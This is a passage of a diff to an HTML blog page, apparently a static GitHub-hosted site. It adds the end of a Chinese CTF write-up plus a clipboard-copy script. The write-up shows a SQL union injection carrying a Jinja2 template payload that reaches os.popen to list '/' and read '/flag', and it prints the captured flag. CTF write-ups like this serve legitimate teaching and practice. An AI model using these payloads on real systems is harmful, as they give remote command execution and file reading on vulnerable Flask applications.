&lt;class 'PermissionError'&gt;, 'ProcessLookupError': &lt;class 'ProcessLookupError'&gt;, 'TimeoutError': &lt;class 'TimeoutError'&gt;, 'open': , 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2023 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., 'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See <a href="http://www.python.org" rel="nofollow">www.python.org</a> for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.}, 'annotations': _Feature((3, 7, 0, 'beta', 1), (3, 10, 0, 'alpha', 0), 16777216), 'errno': &lt;module 'errno' (built-in)&gt;, 'json': &lt;module 'json' from '/usr/local/lib/python3.8/json/<strong>init</strong>.py'&gt;, 'os': &lt;module 'os' from '/usr/local/lib/python3.8/os.py'&gt;, 'types': &lt;module 'types' from '/usr/local/lib/python3.8/types.py'&gt;, 't': &lt;module 'typing' from '/usr/local/lib/python3.8/typing.py'&gt;, 'import_string': &lt;function import_string at 0x7f0cfaeaa310&gt;, 'T': ~T, 'ConfigAttribute': &lt;class 'flask.config.ConfigAttribute'&gt;, 'Config': &lt;class 'flask.config.Config'&gt;}</p>
+<p>搜索发现敏感库os未禁用<br>
+那么掏出调用os库的注入payload看看有没有过滤：</p>
+<pre class="notranslate"><code class="notranslate">1 union select '{{config.__class__.__init__.__globals__.os.popen("ls /").read()}}' --+
+</code></pre>
+<p>发现无waf<br>
+回显：<br>
+app bin boot dev docker-entrypoint.sh etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var<br>
+发现flag<br>
+那么</p>
+<pre class="notranslate"><code class="notranslate">1 union select '{{config.__class__.__init__.__globals__.os.popen("cat /flag").read()}}' --+
+</code></pre>
+<p>拿下flag：ZJNUCTF{SSTI_SQL_GOD!!!!bdc85e3e675e}<br>
 <del>前面的路以后再来探索吧(留档提醒自己更新)</del></p></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
@@ -149,7 +259,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
 var utterancesLoad=0;
 
 let themeSettings={
@@ -222,7 +332,70 @@ function iFrameLoading(){
     }
 }
 
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
 
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
 
 </script>
 
